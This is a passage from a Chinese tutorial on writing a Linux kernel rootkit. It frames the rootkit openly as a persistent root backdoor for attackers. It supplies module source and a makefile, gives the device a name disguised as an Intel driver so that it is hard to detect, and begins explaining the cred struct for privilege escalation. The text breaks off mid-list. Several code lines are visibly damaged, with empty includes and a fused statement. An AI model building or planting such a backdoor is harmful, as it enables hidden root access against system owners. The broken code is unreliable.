# 简易 Linux Rootkit 编写入门指北（一）：模块隐藏与进程提权
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00.概述
“Rootkit”即“root
kit”，直译为中文便是“根权限工具包”的意思，在今天的语境下更多指的是一种被作为驱动程序、加载到操作系统内核中的恶意软件，这一类恶意软件的主要用途便是“驻留在计算机上提供
root 后门”——当攻击者再次拿到某个服务器的 shell 时可以通过 rootkit 快速提权到 root
Linux 下的 rootkit 主要以“可装载内核模块”（LKM）的形式存在，作为内核的一部分 **直接以 ring0 权限向入侵者提供服务**
；当攻击者拿到某台计算机的 shell 并通过相应的漏洞提权到 root 之后便可以在计算机中留下 rootkit，以 **为攻击者后续入侵行为提供驻留的
root 后门**
但是作为内核的一部分， **LKM 编程在一定意义上便是内核编程，与内核版本密切相关，只有使用相应版本内核源码进行编译的 LKM 才可以装载到对应版本的
kernel 上** ，这使得 Linux rootkit
显得有些鸡肋（例如服务器管理员某天升级内核版本你就被扬了），且不似蠕虫病毒那般可以在服务期间肆意传播，但不可否认的是 rootkit 仍是当前 Linux
下较为主流的 root 后门驻留技术之一
本篇文章仅为最基础的 rootkit 编写入门指南，若是需要成熟可用的 rootkit 可以参见 [f0rb1dd3n/Reptile: LKM Linux
rootkit (github.com)](https://github.com/f0rb1dd3n/Reptile)
本篇引用的内核源码来自于 Linux 内核版本 `5.11`
> Linux 下尝试装载不同版本的 LKM 会显示如下错误信息：
>  
>  
>     insmod: ERROR: could not insert module hellokernel.ko: Invalid module
> format
>  
## 0x01. 最简单的 LKM
> 这里不会叙述太多 Linux 内核编程相关的知识，主要以 rootkit 编写所会用到的一些技术为主
>
> 基本的 LKM 编写入门见[这里](https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-> PART-I/#%E4%BA%94%E3%80%81%E7%BC%96%E5%86%99%E5%8F%AF%E8%A3%85%E8%BD%BD%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%EF%BC%88LKMs%EF%BC%89)
以下给出了一个最基础的 LKM 模板，注册了一个字符型设备作为后续使用的接口
> rootkit.c
    /*
    * rootkit.ko
    * developed by arttnba3
    */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "functions.c"
    static int __init rootkit_init(void)
    {
        // register device
        major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_fo);     // major number 0 for allocated by kernel
        if(major_num i_mode |= 0666;
        filp_close(__file, NULL);
        return 0;
    }
    static void __exit rootkit_exit(void)
    {
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
    }
    module_init(rootkit_init);
    module_exit(rootkit_exit);
    MODULE_LICENSE("GPL");
    MODULE_AUTHOR("arttnba3");
> functions.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "rootkit.h"
    static int a3_rootkit_open(struct inode * __inode, struct file * __file)
    {
        return 0;
    }
    static ssize_t a3_rootkit_read(struct file * __file, char __user * user_buf, size_t size, loff_t * __loff)
    {
        return 0;
    }
    static ssize_t a3_rootkit_write(struct file * __file, const char __user * user_buf, size_t size, loff_t * __loff)
    {
        return 0;
    }
    static int a3_rootkit_release(struct inode * __inode, struct file * __file)
    {
        printk(KERN_INFO "get info");
        return 0;
    }
    static long a3_rootkit_ioctl(struct file * __file, unsigned int cmd, unsigned long param)
    {
        return 0;
    }
> rootkit.h
    #include 
    #include 
    #include 
    #include 
    #include 
    // a difficult-to-detect name
    #define DEVICE_NAME "intel_rapl_msrdv"
    #define CLASS_NAME "intel_rapl_msrmd"
    #define DEVICE_PATH "/dev/intel_rapl_msrdv"
    static int major_num;
    static struct class * module_class = NULL;
    static struct device * module_device = NULL;
    static struct file * __file = NULL;
    struct inode * __inode = NULL;
    static int __init rootkit_init(void);
    static void __exit rootkit_exit(void);
    static int a3_rootkit_open(struct inode *, struct file *);
    static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
    static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
    static int a3_rootkit_release(struct inode *, struct file *);
    static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);
    static struct file_operations a3_rootkit_fo = 
    {
        .owner = THIS_MODULE,
        .unlocked_ioctl = a3_rootkit_ioctl,
        .open = a3_rootkit_open,
        .read = a3_rootkit_read,
        .write = a3_rootkit_write,
        .release = a3_rootkit_release,
    };
> makefile
    # Makefile2.6
    obj-m += rootkit.o
    CURRENT_PATH := $(shell pwd)
    LINUX_KERNEL := $(shell uname -r)
    LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL)
    all:
        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules
    clean:
        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean
我们接下来将以该模块作为蓝本进行修改
## 0x02.进程权限提升
###  cred 结构体
对于 Linux 下的每一个进程，在 kernel 中都有着一个结构体 `cred`
用以标识其权限，该结构体定义于内核源码`include/linux/cred.h`中，如下：
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC    0x43736564
    #define CRED_MAGIC_DEAD    0x44656144
    #endif
        kuid_t        uid;        /* real UID of the task */
        kgid_t        gid;        /* real GID of the task */
        kuid_t        suid;        /* saved UID of the task */
        kgid_t        sgid;        /* saved GID of the task */
        kuid_t        euid;        /* effective UID of the task */
        kgid_t        egid;        /* effective GID of the task */
        kuid_t        fsuid;        /* UID for VFS ops */
        kgid_t        fsgid;        /* GID for VFS ops */
        unsigned    securebits;    /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;    /* caps we're permitted */
        kernel_cap_t    cap_effective;    /* caps we can actually use */
        kernel_cap_t    cap_bset;    /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char    jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key    *session_keyring; /* keyring inherited over fork */
        struct key    *process_keyring; /* keyring private to this process */
        struct key    *thread_keyring; /* keyring private to this thread */
        struct key    *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;    /* subjective LSM security */
    #endif
        struct user_struct *user;    /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;    /* supplementary groups for euid/fsgid */
        /* RCU deletion */
        union {
            int non_rcu;            /* Can we skip RCU deletion? */
            struct rcu_head    rcu;        /* RCU deletion hook */
        };
    } __randomize_layout;
我们主要关注 uid ，一个cred结构体中记载了 **一个进程四种不同的用户ID** ：
  * **真实用户ID** （real UID）：标识一个进程 **启动时的用户ID**
  * **保存用户ID** （saved UID）：标识一个进程 **最初的有效用户ID**